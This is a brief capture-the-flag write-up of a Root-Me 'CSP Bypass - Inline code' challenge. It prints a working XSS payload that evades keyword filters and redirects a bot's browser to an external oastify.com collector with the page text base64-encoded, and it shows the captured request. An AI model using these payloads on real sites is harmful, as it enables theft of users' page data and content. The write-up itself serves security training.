# CSP bypass inline

[root-me challenge CSP Bypass - Inline code](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code): Exfiltrate the content of the page.

----

```text
Content-Security-Policy: connect-src 'none'; font-src 'none'; frame-src 'none'; img-src 'self'; manifest-src 'none'; media-src 'none'; object-src 'none'; script-src 'unsafe-inline'; style-src 'self'; worker-src 'none'; frame-ancestors 'none'; block-all-mixed-content;
```

`script-src 'unsafe-inline'` allows the execution of unsafe in-page scripts and event handlers.

Test for simple XSS on user parameter:

```text
http://challenge01.root-me.org:58008/page?user=<img src="" onerror="alert(1)">
```

"Only the bot can see the flag": There is a bot on the server that can read the content of the page with the flag. Go to the `/report` page to submit a form containing the found XSS.

The server filters keywords like `http`, use `//` instead, and a space instead of `+` and use the `concat()` function:

```text
<img src="" onerror="window.location.href='//szv6rjvql5y6v5akgsvrda0rmis9gz4o.oastify.com?c='.concat(btoa(btoa(document.getElementsByTagName('body')[0].innerText)))">
```

Request received:

```text
GET /?c=Q2drS0NRbFhaV3hqYjIxbExDQWdJUW9LQ1NBZ0NRb2dJQ0FnSUNBZ0lFRjBJRkYxWVdOcmNYVmhZMnNnWTI5eWNDQjBhR1VnWkdWMlpXeHZjR1Z5Y3lCMGFHbHVheUIwYUdGMElIUm9aWGtnWkc4Z2JtOTBJR2hoZG1VZ2RHOGdjR0YwWTJnZ1dGTlRJR0psWTJGMWMyVWdkR2hsZVNCcGJYQnNaVzFsYm5RZ2RHaGxJRU52Ym5SbGJuUWdVMlZqZFhKcGRIa2dVRzlzYVdONUlDaERVMUFwTGlCQ2RYUWdlVzkxSUdGeVpTQmhJR2hoWTJ0bGNpd2djbWxuYUhRZ1B5QkpKMjBnYzNWeVpTQjViM1VnZDJsc2JDQmlaU0JoWW14bElIUnZJR1Y0Wm1sc2RISmhkR1VnZEdocGN5Qm1iR0ZuT2lCN1JreEJSMTlTUlVSQlExUkZSSDB1SUNoUGJteDVJSFJvWlNCaWIzUWdhWE1nWVdKc1pTQjBieUJ6WldVZ2RHaGxJR1pzWVdjcENna2dJQWtLQ1NBZ0NRb0pJQ0FKQ1VScFpDQjViM1VnWm1sdVpDQmhJSFoxYkc1bGNtRmlhV3hwZEhrZ1B5QkdhV3hzSUhSb2FYTWdabTl5YlM0S0NTQWdDUW9KQ2dvZ0lBb0s= HTTP/1.1
Host: szv6rjvql5y6v5akgsvrda0rmis9gz4o.oastify.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://challenge01.root-me.org:58008/
Upgrade-Insecure-Requests: 1
```

I'll come back to this later.
